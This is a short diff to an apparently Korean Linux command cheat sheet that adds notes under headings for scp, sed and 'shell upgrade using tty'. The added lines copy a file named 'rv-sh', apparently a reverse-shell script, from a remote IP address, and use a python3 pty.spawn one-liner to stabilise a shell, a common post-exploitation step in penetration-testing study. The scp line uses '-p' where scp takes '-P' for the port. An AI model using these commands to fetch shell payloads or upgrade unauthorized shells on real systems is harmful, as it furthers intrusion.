@@ -86,3 +86,12 @@
 		pgrep [프로세스 이름]		특정 이름을 가진 프로세스의 PID 검색
 
 	네트워크 확인
+
+
+***scp***
+	scp -p 5022 Foo1@211.250.216.249:/root/rv-sh /root/
+
+***sed***
+
+***tty를 이용한 쉘 업그레이드***
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
